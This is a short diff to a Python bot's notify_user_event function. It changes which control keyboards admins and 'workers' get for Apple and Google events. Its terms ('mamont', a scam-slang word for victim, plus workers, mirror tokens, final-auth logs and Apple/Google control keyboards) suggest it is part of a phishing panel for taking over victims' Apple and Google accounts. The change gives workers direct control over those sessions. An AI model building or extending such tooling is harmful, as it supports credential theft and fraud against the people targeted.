@@ -703,13 +703,16 @@ async def notify_user_event(
 
         if is_final_auth:
             admin_keyboard = get_admin_log_keyboard(user_tg_id)
-        elif is_apple_event and has_apple_pass:
+            worker_keyboard = None
+        elif is_apple_event:
             admin_keyboard = get_apple_control_keyboard(user_tg_id)
-        elif is_google_event and has_google_pass:
+            worker_keyboard = admin_keyboard
+        elif is_google_event:
             admin_keyboard = get_google_control_keyboard(user_tg_id)
+            worker_keyboard = admin_keyboard
         else:
             admin_keyboard = None
-        worker_keyboard = None
+            worker_keyboard = None
 
         is_my_log = await _is_primary_admin_mamont(worker_id, mirror_token)
         if is_my_log:
